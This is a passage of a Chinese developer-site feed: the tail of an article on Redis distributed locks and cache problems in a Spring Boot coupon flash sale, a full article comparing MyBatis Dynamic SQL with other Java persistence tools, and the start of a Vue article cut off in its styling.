    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">seckillCoupon</span>(<span class="hljs-params"><span class="hljs-meta">@PathVariable</span> <span class="hljs-built_in">String</span> couponId</span>) {
        <span class="hljs-title class_">String</span> lockKey = <span class="hljs-string">"coupon:lock:"</span> + couponId;
        <span class="hljs-title class_">String</span> uniqueValue = <span class="hljs-variable constant_">UUID</span>.<span class="hljs-title function_">randomUUID</span>().<span class="hljs-title function_">toString</span>();
        <span class="hljs-built_in">boolean</span> success = redisLockUtil.<span class="hljs-title function_">tryGetLock</span>(lockKey, uniqueValue, <span class="hljs-number">10</span>, <span class="hljs-title class_">TimeUnit</span>.<span class="hljs-property">SECONDS</span>);
        <span class="hljs-keyword">if</span> (success) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 执行抢券业务逻辑，例如检查库存、扣减库存等</span>
                <span class="hljs-built_in">boolean</span> hasCoupon = <span class="hljs-title function_">checkCouponStock</span>(couponId);
                <span class="hljs-keyword">if</span> (hasCoupon) {
                    <span class="hljs-title function_">reduceCouponStock</span>(couponId);
                    <span class="hljs-keyword">return</span> <span class="hljs-string">"抢券成功"</span>;
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">return</span> <span class="hljs-string">"优惠券已抢完"</span>;
                }
            } <span class="hljs-keyword">finally</span> {
                redisLockUtil.<span class="hljs-title function_">releaseLock</span>(lockKey, uniqueValue);
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"抢券失败，请稍后重试"</span>;
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">checkCouponStock</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> couponId</span>) {
        <span class="hljs-comment">// 这里实现检查优惠券库存的逻辑，例如从数据库或缓存中查询</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">reduceCouponStock</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> couponId</span>) {
        <span class="hljs-comment">// 这里实现扣减优惠券库存的逻辑，例如更新数据库或缓存中的库存数量</span>
    }
}
</code></pre>
<p>在上述代码中，当用户发起抢券请求时，首先生成一个唯一的 uniqueValue，然后尝试通过 RedisLockUtil 获取锁。如果获取锁成功，则执行抢券业务逻辑，包括检查库存和扣减库存；在业务逻辑执行完毕后，无论是否成功抢到券，都通过 RedisLockUtil 释放锁。如果获取锁失败，则直接返回抢券失败提示。</p>
<h2 data-id="heading-4">解决抢券逻辑中可能存在的问题</h2>
<p><strong>（一）性能瓶颈问题</strong></p>
<p>在高并发场景下，大量请求争抢锁可能会导致性能瓶颈。当多个线程同时尝试获取锁时，只有一个线程能够成功，其他线程需要等待。随着并发量的增加，等待锁的线程数量也会增多，这将导致系统的响应时间变长，吞吐量下降。</p>
<p>为了解决性能瓶颈问题，可以采取以下几种策略：</p>
<ol>
<li><strong>减少锁的持有时间</strong>：尽量优化抢券业务逻辑，减少在持有锁期间执行的操作，尽快释放锁，以便其他线程能够更快地获取锁。例如，可以将一些非关键的操作放到获取锁之前或释放锁之后执行。</li>
<li><strong>采用分段锁</strong>：将不同的优惠券分配到不同的锁上，减少锁竞争。例如，可以按照优惠券的类型、面额等维度进行分段，每个分段使用一个独立的锁。这样，不同分段的优惠券抢券请求可以并行处理，提高系统的并发处理能力。</li>
<li><strong>使用缓存预热</strong>：在抢券活动开始前，提前将优惠券库存等相关数据加载到缓存中，减少在抢券过程中对数据库的访问，从而提高系统的响应速度。同时，也可以减少因数据库访问压力过大导致的性能问题。</li>
</ol>
<p><strong>（二）锁过期时间设置不合理问题</strong></p>
<p>锁过期时间设置不合理可能会导致两种情况：一是锁过期时间过长，会导致其他线程长时间等待，降低系统的并发性能；二是锁过期时间过短，可能会出现业务逻辑尚未执行完毕，锁就已经过期，从而导致并发问题，如超卖现象。</p>
<p>为了合理设置锁过期时间，可以通过以下方法：</p>
<ol>
<li><strong>压测确定合适时间</strong>：在正式上线抢券功能之前，通过压测工具模拟高并发场景，测试不同锁过期时间下系统的性能和稳定性，从而确定一个既能满足业务需求，又能保证系统性能的锁过期时间。</li>
<li><strong>动态调整过期时间</strong>：根据实际业务情况，动态调整锁的过期时间。例如，可以根据优惠券的数量、预计参与抢券的用户数量等因素，实时计算并设置合理的锁过期时间。</li>
<li><strong>锁续期机制</strong>：为了防止业务逻辑执行时间超过锁过期时间，可以引入锁续期机制。当持有锁的线程发现锁快要过期时，自动延长锁的过期时间。在 Redisson（一个功能强大的 Redis Java 客户端）中，就提供了锁看门狗机制来实现锁续期。默认情况下，Redisson 的锁看门狗超时为 30 秒，它会在锁持有者处于活动状态时自动延长锁的过期时间。</li>
</ol>
<p><strong>（三）缓存击穿问题</strong></p>
<p>缓存击穿是指当热点 Key 在 Redis 中过期时，大量请求会同时穿透到数据库，导致数据库负载瞬间增大，甚至可能导致数据库崩溃。在抢券场景中，如果某个热门优惠券的库存信息在 Redis 中过期，而此时有大量用户同时请求抢该优惠券，就会出现缓存击穿问题。</p>
<p>为了解决缓存击穿问题，可以采取以下措施：</p>
<ol>
<li><strong>使用互斥锁</strong>：在缓存失效时，通过互斥锁（如 Redis 分布式锁）来保证只有一个线程能够从数据库加载数据并更新缓存，其他线程等待。当第一个线程更新完缓存后，其他线程再从缓存中获取数据，从而避免大量请求同时穿透到数据库。</li>
<li><strong>热点数据永不过期</strong>：对于一些热点数据，如热门优惠券的库存信息，可以设置为永不过期。同时，通过定时任务或其他机制，在后台定期更新这些热点数据，保证数据的一致性。</li>
<li><strong>缓存预热</strong>：在抢券活动开始前，提前将热点优惠券的库存信息加载到 Redis 缓存中，并设置合理的过期时间，避免在活动开始时出现缓存击穿问题。</li>
</ol>
<p><strong>（四）缓存雪崩问题</strong></p>
<p>缓存雪崩是指当缓存中大量 Key 同时失效，或缓存服务器宕机，导致大量请求直接访问数据库，造成数据库负载激增，甚至可能导致数据库崩溃。在抢券场景中，如果大量优惠券的库存信息在 Redis 中设置了相同的过期时间，当这些 Key 同时过期时，就会出现缓存雪崩问题。</p>
<p>为了防止缓存雪崩问题，可以采取以下策略：</p>
<ol>
<li><strong>设置不同的过期时间</strong>：在将优惠券库存信息存入 Redis 时，为每个 Key 设置不同的过期时间，避免大量 Key 同时过期。可以通过在过期时间上添加一个随机值来实现，例如，原本设置过期时间为 60 秒，可以改为设置为 60 + 随机值（0 - 10）秒。</li>
<li><strong>使用多级缓存</strong>：采用多级缓存架构，如在 Redis 之前再添加一层本地缓存（如 Caffeine）。当 Redis 中的缓存失效时，请求可以先从本地缓存中获取数据，如果本地缓存中也没有数据，再去访问 Redis 或数据库。这样可以在一定程度上缓解 Redis 缓存失效对数据库造成的压力。</li>
<li><strong>缓存预热和高可用备份</strong>：在抢券活动开始前，进行充分的缓存预热，确保大部分数据已经加载到缓存中。同时，搭建 Redis 集群，实现高可用备份，当某个 Redis 节点宕机时，其他节点能够继续提供服务，避免因缓存服务器宕机导致的缓存雪崩问题。</li>
</ol>
<p><strong>（五）缓存穿透问题</strong></p>
<p>缓存穿透是指恶意请求或者查询不存在的数据（即缓存和数据库中都没有的数据），导致大量请求直接访问数据库，对系统造成影响。在抢券场景中，如果有人恶意构造不存在的优惠券 ID 进行抢券请求，就可能出现缓存穿透问题。</p>
<p>为了解决缓存穿透问题，可以采取以下方法：</p>
<ol>
<li><strong>使用布隆过滤器</strong>：在系统中引入布隆过滤器，将所有有效的优惠券 ID 提前添加到布隆过滤器中。当有抢券请求时，先通过布隆过滤器判断优惠券 ID 是否有效。如果布隆过滤器判断该 ID 无效，则直接返回，不再访问数据库，从而避免大量无效请求穿透到数据库。</li>
<li><strong>缓存空对象</strong>：当查询数据库发现某个优惠券 ID 不存在时，将一个空对象缓存到 Redis 中，并设置一个较短的过期时间。这样，下次再有相同的请求时，可以直接从缓存中获取空对象，而不需要访问数据库。</li>
<li><strong>对请求参数进行校验</strong>：在接收到抢券请求时，对请求参数进行严格校验，确保优惠券 ID 等参数的合法性。对于非法的请求，直接返回错误提示，不进行后续处理，从而防止恶意请求对系统造成影响。</li>
</ol>
<h2 data-id="heading-5">总结</h2>
<p>通过在 Spring Boot3 项目中结合 Redis 实现分布式锁机制，我们能够有效地解决高并发抢券场景中的诸多问题，确保抢券逻辑的正确执行和数据的一致性。然而，在实际应用中，还需要根据具体的业务需求和系统架构，综合考虑各种因素，选择合适的技术方案和优化策略。</p>
<p>随着互联网技术的不断发展，高并发场景将越来越复杂，对系统性能和稳定性的要求也将越来越高。未来，我们可以进一步探索更高效、更可靠的分布式锁实现方式，如 Redlock 算法（Redis 官方提出的一种基于多节点的分布式锁算法），以及结合其他技术（如消息队列、分布式事务等）来优化抢券业务流程。同时，持续关注性能优化、容灾备份、安全防护等方面的技术发展，不断提升系统的整体性能和可靠性，为用户提供更加优质的服务体验。希望本文能够为广大互联网软件开发人员在实现高并发抢券逻辑时提供有益的参考和帮助。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[简说 Mybatis Dynamic SQL]]></title>    <link>https://juejin.cn/post/7581807793133715502</link>    <guid>https://juejin.cn/post/7581807793133715502</guid>    <pubDate>2025-12-10T05:30:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581807793133715502" data-draft-id="7581888578508029979" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="简说 Mybatis Dynamic SQL "/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-10T05:30:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SnrtIevg"/> <meta itemprop="url" content="https://juejin.cn/user/3087084381015342"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            简说 Mybatis Dynamic SQL 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3087084381015342/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SnrtIevg
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T05:30:04.000Z" title="Wed Dec 10 2025 05:30:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Mybatis Dynamic SQL 介绍</h2>
<h3 data-id="heading-1">一、MyBatis Dynamic SQL 核心概述与设计哲学</h3>
<p><code>MyBatis Dynamic SQL</code> 是 MyBatis 官方团队在2016年底推出的一个子项目，旨在为 <code>MyBatis 3</code> 提供一种类型安全、纯<code>Java</code>代码的动态SQL构建方式，以彻底摆脱对XML映射文件的依赖。它<strong>并非一个独立的ORM框架</strong>，而是MyBatis的一个SQL构建器库。</p>
<p>其核心设计哲学是：</p>
<ul>
<li><strong>代码即SQL</strong>：将SQL语句的结构通过<code>Java</code>方法调用清晰地表达出来，使SQL逻辑成为编译时可检查的代码的一部分，而非运行时拼接的字符串。</li>
<li><strong>类型安全</strong>：利用<code>Java</code>泛型和强类型，确保表名、列名、条件值等在编译时就被检查，极大减少了因拼写错误或类型不匹配导致的运行时错误。</li>
<li><strong>流畅的API（Fluent API）</strong>：提供链式调用的API，让SQL构建过程读起来像自然语言，提升了代码的可读性和编写体验。</li>
<li><strong>与MyBatis核心无缝集成</strong>：它生成的最终对象（如SelectStatementProvider）可以直接被原生的MyBatis Mapper接口接收和执行，完美融入现有MyBatis生态。</li>
</ul>
<h3 data-id="heading-2">二、MyBatis Dynamic SQL 关键特性详解</h3>
<p><strong>声明式表与列对象</strong>：框架鼓励为每个数据库表生成对应的“支持类”（Support Class），其中包含表的元数据（如表名、列名）作为静态常量。这使得在编写SQL时可以直接引用这些常量，而非字符串，实现了编译时安全。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 示例：引用生成的列常量</span>
SelectStatementProvider selectStatement = <span class="hljs-built_in">select</span>(id, animalName, bodyWeight, brainWeight)
                                            <span class="hljs-selector-class">.from</span>(animalData)
                                            <span class="hljs-selector-class">.where</span>(id, isEqualTo(<span class="hljs-number">1</span>))
                                            <span class="hljs-selector-class">.build</span>()
                                            <span class="hljs-selector-class">.render</span>(RenderingStrategies.MYBATIS3);
</code></pre>
<p><strong>强大的条件构建（Where Clauses）</strong>：提供了丰富的条件构建方法（如<code>isEqualTo</code>, <code>isGreaterThan</code>, <code>isLike</code>, <code>isIn</code>, <code>isBetween</code>等），并且可以通过<code>and()</code>和<code>or()</code>方法进行灵活的逻辑组合。这解决了传统MyBatis XML中需要手动处理AND/OR逻辑和括号的难题。</p>
<p><strong>全面的SQL语句支持</strong>：官方文档显示，它完整支持所有主要的SQL操作：</p>
<p><strong>查询（SELECT）</strong>：支持连接（JOIN）、子查询、聚合函数、分组（GROUP BY）、排序（ORDER BY）等复杂查询构建。
<strong>数据操作（INSERT, UPDATE, DELETE）</strong>：支持批量插入、根据条件更新和删除，API设计一致。
函数与表达式：支持在SQL中嵌入数据库函数和Case表达式，增强了灵活性。</p>
<p><strong>动态SQL的本质实现</strong>：其“动态”特性体现在，通过<code>Java</code>代码的逻辑判断（if-else、循环等）来决定是否添加某个查询条件或SQL片段。这比XML中的<code>&lt;if&gt;</code>、<code>&lt;choose&gt;</code>标签更为灵活，因为你可以利用完整的<code>Java</code>语言能力。</p>
<p><strong>工作原理</strong>：开发者通过流畅的API构建一个“模型”（<code>Model</code>），然后调用<code>build().render()</code>方法，该库会根据配置的渲染策略（<code>RenderingStrategies.MYBATIS3</code>）将模型转换为<code>MyBatis</code>可执行的Provider SQL语句和参数映射，完全避免了手动拼接SQL字符串和参数索引的麻烦。</p>
<h3 data-id="heading-3">三、与主流动态SQL方案的对比分析</h3>





































































<table><thead><tr><th>特性 / 方案</th><th>MyBatis Dynamic SQL (官方)</th><th>传统MyBatis XML动态SQL</th><th>MyBatis-Plus 条件构造器</th><th>Fluent MyBatis</th><th>JOOQ</th></tr></thead><tbody><tr><td>核心形态</td><td>纯Java代码，类型安全的SQL构建器库</td><td>XML标签 + OGNL表达式</td><td>Java Lambda条件构造器，是MyBatis的增强插件</td><td>基于代码生成的流式API框架</td><td>独立的、类型安全的SQL构建与执行框架</td></tr><tr><td>SQL编写体验</td><td>流畅API，编译时类型检查，IDE支持好（代码补全、导航）。但需手动构建完整SQL</td><td>在XML中写SQL和动态标签，直观但需在Java和XML间切换，类型不安全，易有拼写错误</td><td>单表操作极简，Lambda引用属性，防误写。但多表关联查询支持弱，复杂SQL仍需回退到XML</td><td>流式API，IDE支持极佳，字段和方法提示丰富。但已停止更新，存在社区风险</td><td>体验公认最佳，纯Java类型安全DSL，API设计极其优雅且强大。</td></tr><tr><td>动态SQL能力</td><td>通过Java逻辑实现动态，能力最强最灵活。</td><td>通过<code>&lt;if&gt;</code>, <code>&lt;choose&gt;</code>, <code>&lt;foreach&gt;</code>等标签实现，能力强大，但复杂逻辑可读性下降</td><td>主要针对WHERE条件动态拼接，能力集中于单表简单查询。</td><td>提供丰富的动态查询、更新、删除API，能力较强。</td><td>动态构建能力极强，是原生设计理念。</td></tr><tr><td>学习与迁移成本</td><td>需学习一套新API，但理念现代。从MyBatis迁移方便。</td><td>MyBatis开发者最熟悉，学习成本低，但最佳实践（如防注入）需注意</td><td>对MyBatis用户非常友好，入门简单，符合Java习惯。</td><td>需理解其代码生成和增强机制，有一定学习成本。</td><td>学习曲线较陡，但掌握后效率极高。需处理代码生成步骤。</td></tr><tr><td>性能与安全性</td><td>高安全性，参数均为预编译占位符，从根源杜绝SQL注入。性能与手写SQL无异。</td><td>高安全性，使用#{}预编译。性能良好，但复杂动态SQL的XML解析可能有极微开销。</td><td>高安全性，基于MyBatis。性能好。</td><td>高安全性，基于MyBatis。性能好。</td><td>高安全性，类型安全构建。性能优秀，接近手写JDBC。</td></tr><tr><td>主要优势</td><td>官方出品，类型安全，无XML，与MyBatis生态无缝融合，动态能力最灵活。</td><td>技术成熟，社区庞大，复杂SQL直观可见、便于统一管理和调优</td><td>极大地简化了单表CRUD，开发效率高，国内生态活跃。</td><td>在类型安全和流畅API上取得了很好平衡，开发体验好。</td><td>标准、强大、优雅，被认为是Java中SQL构建的“黄金标准”，支持多数据库方言。</td></tr><tr><td>主要劣势</td><td>手写代码量相对较多，尤其对于简单CRUD；需要额外的代码生成步骤来获得最佳体验</td><td>“XML地狱”，大量XML文件难维护；接口与XML映射易出错；重构不便</td><td>不是通用的动态SQL解决方案，复杂多表查询是其短板；对MyBatis原生功能有一定封装和侵入。</td><td>项目已停更，不适合用于新项目。</td><td>商业许可限制，对Oracle、SQL Server等商用数据库需付费；整体较重。</td></tr></tbody></table>
<p><strong>补充比较</strong>：Spring Data JPA
JPA（如Hibernate）及其扩展Spring Data JPA代表了另一种“对象优先”的范式。其优势在于极致简单的CRUD和标准化的Repository模式。然而，其动态复杂查询的构建非常笨拙（需要拼接JpaSpecificationExecutor或Criteria API），可读性和可维护性在复杂场景下急剧下降，常被戏称为“<strong>初期一时爽，动态SQL火葬场</strong>”。它适合领域驱动设计（DDD）和事务性操作密集的场景，但对于需要复杂、高性能查询的系统，其灵活性和可控性不如MyBatis系方案。</p>
<h3 data-id="heading-4">四、总结与选型建议</h3>
<p>MyBatis Dynamic SQL是MyBatis官方为拥抱“代码化配置”趋势、解决XML繁琐问题而推出的现代化、类型安全的解决方案。它特别适合：</p>
<ul>
<li>追求类型安全和编译时检查的团队。</li>
<li>厌恶XML配置，希望SQL逻辑全部由<code>Java</code>代码管理的项目。</li>
<li>需要构建极其复杂、动态的查询逻辑，且希望拥有完全控制权的场景。</li>
<li>现有MyBatis项目寻求架构升级，希望减少XML而保持技术栈稳定。</li>
</ul>
<p>选型决策树参考：</p>
<ul>
<li>如果项目以简单的单表CRUD为主，追求极致开发速度：MyBatis-Plus是最佳选择。</li>
<li>如果项目充满复杂的、多变的查询逻辑，且团队重视SQL可控性和性能：
<ul>
<li>接受XML：传统MyBatis XML动态SQL仍是久经考验的可靠选择。</li>
<li>拒绝XML，接受一定代码量：MyBatis Dynamic SQL是官方的未来方向。</li>
<li>预算充足，追求顶级开发体验和长期维护：JOOQ值得投资。</li>
</ul>
</li>
<li>如果项目采用严格的DDD架构，且复杂查询不多：Spring Data JPA可能更合适。</li>
<li>对于新启动的项目，应谨慎选择已停止维护的框架，如Fluent MyBatis。</li>
</ul>
<p>总而言之，MyBatis Dynamic SQL在MyBatis生态中填补了“类型安全”和“无XML”的空白，为开发者提供了一个介于传统XML与JOOQ式体验之间的强大选项。它的出现，反映了<code>Java</code>持久层技术向更安全、更现代、更符合开发者编码习惯的方向演进。</p>
<p>但是令人疑惑的是这个项目并没有流行起来， 令人可惜。</p>
<p>参考文档: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmybatis.org%2Fmybatis-dynamic-sql%2Fdocs%2Fintroduction.html" target="_blank" title="https://mybatis.org/mybatis-dynamic-sql/docs/introduction.html" ref="nofollow noopener noreferrer">Mybatis-Dynaimc-SQL</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue里的ref和reactive的工作原理是什么？以及它们的区别是什么？为什么有人说reactive“废弃”了？]]></title>    <link>https://juejin.cn/post/7581769891499212819</link>    <guid>https://juejin.cn/post/7581769891499212819</guid>    <pubDate>2025-12-10T03:51:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581769891499212819" data-draft-id="7581752508780806187" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue里的ref和reactive的工作原理是什么？以及它们的区别是什么？为什么有人说reactive“废弃”了？"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-10T03:51:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户7700362205757"/> <meta itemprop="url" content="https://juejin.cn/user/1775053506361337"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue里的ref和reactive的工作原理是什么？以及它们的区别是什么？为什么有人说reactive“废弃”了？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1775053506361337/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户7700362205757
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:51:38.000Z" title="Wed Dec 10 2025 03:51:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body 